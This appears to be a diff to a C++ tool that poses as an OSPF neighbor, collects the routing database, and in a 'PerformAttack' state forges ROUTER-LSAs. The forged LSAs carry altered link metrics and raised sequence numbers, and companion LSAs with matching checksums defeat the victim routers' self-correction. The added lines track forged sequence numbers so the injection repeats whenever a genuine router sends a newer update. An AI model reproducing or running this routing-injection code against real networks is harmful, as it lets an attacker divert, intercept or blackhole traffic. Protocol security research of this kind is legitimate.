@@ -163,8 +163,8 @@ namespace statemachine {
 				
 				context<Machine>().neighbor_hello = packet.packet;
 				
-				logger->info("Found neighbor {}.", Tins::IPv4Address(parser::byteswap<uint32_t>(
-					context<Machine>().neighbor_hello->getHeader().router_id)).to_string());
+				logger->info("Found neighbor {}.",
+				             Tins::IPv4Address(parser::byteswap<uint32_t>(context<Machine>().neighbor_hello->getHeader().router_id)).to_string());
 				
 				return transit<DatabaseTransfer>();
 			}
@@ -223,8 +223,7 @@ namespace statemachine {
 				}
 				
 				auto &partialLSAs = context<DatabaseTransfer>().partialLSAs;
-				auto &lsas = std::dynamic_pointer_cast<parser::DatabaseDescriptionPacket>(
-					packet.packet->getSubpacket())->getLsas();
+				auto &lsas = std::dynamic_pointer_cast<parser::DatabaseDescriptionPacket>(packet.packet->getSubpacket())->getLsas();
 				partialLSAs.insert(partialLSAs.end(), lsas.begin(), lsas.end());
 				logger->debug("Obtained {} lsas.", lsas.size());
 				
@@ -293,8 +292,7 @@ namespace statemachine {
 				}
 				
 				auto &fullLSAs = context<Machine>().lsas;
-				auto &lsas = std::dynamic_pointer_cast<parser::LinkStateUpdatePacket>(
-					packet.packet->getSubpacket())->getLsas();
+				auto &lsas = std::dynamic_pointer_cast<parser::LinkStateUpdatePacket>(packet.packet->getSubpacket())->getLsas();
 				fullLSAs.insert(fullLSAs.end(), lsas.begin(), lsas.end());
 				logger->debug("Obtained {} lsas.", lsas.size());
 				
@@ -335,6 +333,7 @@ namespace statemachine {
 			typedef sc::custom_reaction<event::Packet> reactions;
 			typedef sc::state<PerformAttack, Machine> my_base;
 			std::set<uint32_t> relevantRouters;
+			std::map<uint32_t, int32_t> lastSequenceForRouter;
 			
 			PerformAttack(my_context ctx) : my_base(ctx) {
 				logger->info("Performing attack...");
@@ -347,28 +346,21 @@ namespace statemachine {
 				}
 				
 				for (auto const &lsa : context<Machine>().lsas) {
-					if (lsa->getHeader().getFunction() == parser::LSAPacket::ROUTER_LSA &&
-					    relevantRouters.count(lsa->getHeader().advertising_router) > 0) {
+					if (lsa->getHeader().getFunction() == parser::LSAPacket::ROUTER_LSA && relevantRouters.count(lsa->getHeader().advertising_router) > 0) {
 						
-						logger->debug("Found ROUTER-LSA from {}.", Tins::IPv4Address(
-							parser::byteswap<uint32_t>(
-								lsa->getHeader().advertising_router)).to_string());
+						logger->debug("Found ROUTER-LSA from {}.",
+						              Tins::IPv4Address(parser::byteswap<uint32_t>(lsa->getHeader().advertising_router)).to_string());
 						
-						auto newLSA = std::make_shared<parser::LSAPacket>(
-							lsa->serialize());
+						auto newLSA = std::make_shared<parser::LSAPacket>(lsa->serialize());
 						
 						{
-							auto newRouterLSA = std::dynamic_pointer_cast<parser::RouterLSAPacket>(
-								newLSA->getSubpacket());
+							auto newRouterLSA = std::dynamic_pointer_cast<parser::RouterLSAPacket>(newLSA->getSubpacket());
 							
 							auto interfaces = newRouterLSA->getInterfaces();
 							for (auto &interface : interfaces) {
 								for (auto const&[a, b, metric] : context<Machine>().targets) {
-									if ((interface.neighbor_router_id == a &&
-									     lsa->getHeader().advertising_router ==
-									     b) || (interface.neighbor_router_id == b &&
-									            lsa->getHeader().advertising_router ==
-									            a)) {
+									if ((interface.neighbor_router_id == a && lsa->getHeader().advertising_router == b) ||
+									    (interface.neighbor_router_id == b && lsa->getHeader().advertising_router == a)) {
 										interface.metric = metric;
 									}
 								}
@@ -379,8 +371,7 @@ namespace statemachine {
 							hdr.age = 0;
 							hdr.seq += 0x10;
 							newLSA->setHeader(hdr);
-							logger->debug("Forged LSA has seq {} ({}).", hdr.seq,
-							              util::to_hex_string(hdr.seq));
+							logger->debug("Forged LSA has seq {} ({}).", hdr.seq, util::to_hex_string(hdr.seq));
 						}
 						
 						auto origFBLSA = std::make_shared<parser::LSAPacket>(
@@ -411,6 +402,8 @@ namespace statemachine {
 							
 							newFBLSA = yay.value();
 							newFBLSA->updateValues();
+							
+							lastSequenceForRouter[lsa->getHeader().advertising_router] = newFBLSA->getHeader().seq;
 							
 							if (newFBLSA->getHeader().checksum != origFBLSA->getHeader().checksum) {
 								throw parser::MalformedPacketException("Checksum mismatch.");
@@ -499,8 +492,10 @@ namespace statemachine {
 				
 				auto &lsas = std::dynamic_pointer_cast<parser::LinkStateUpdatePacket>(packet.packet->getSubpacket())->getLsas();
 				
-				for (auto const& lsa : lsas) {
-					if (lsa->getHeader().getFunction() == parser::LSAPacket::ROUTER_LSA && relevantRouters.count(lsa->getHeader().advertising_router) > 0) {
+				for (auto const &lsa : lsas) {
+					if (lsa->getHeader().getFunction() == parser::LSAPacket::ROUTER_LSA
+					    && lastSequenceForRouter.count(lsa->getHeader().advertising_router) > 0
+					    && lastSequenceForRouter[lsa->getHeader().advertising_router] < lsa->getHeader().seq) {
 						return transit<PerformAttack>();
 					}
 				}
